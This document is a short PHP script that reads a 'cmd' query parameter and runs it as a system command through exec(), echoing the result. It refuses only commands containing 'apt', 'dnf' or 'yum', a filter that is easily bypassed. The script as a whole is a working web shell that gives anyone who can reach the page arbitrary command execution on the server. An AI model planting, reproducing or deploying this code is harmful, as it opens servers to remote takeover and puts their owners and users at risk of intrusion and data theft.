<?php
if (isset($_GET["cmd"])) {False;} else {
    echo "command not supplied. add the get paramater 'cmd' and put a valid linux command there";
    exit();
}
$command = $_GET["cmd"];
if (stristr($command, "apt")) {
    echo "command blocked";
} elseif (stristr($command, "dnf")) {
    echo "command blocked";
} elseif (stristr($command, "yum")) {
    echo "command blocked";
} else {
    echo exec($command);
}
?>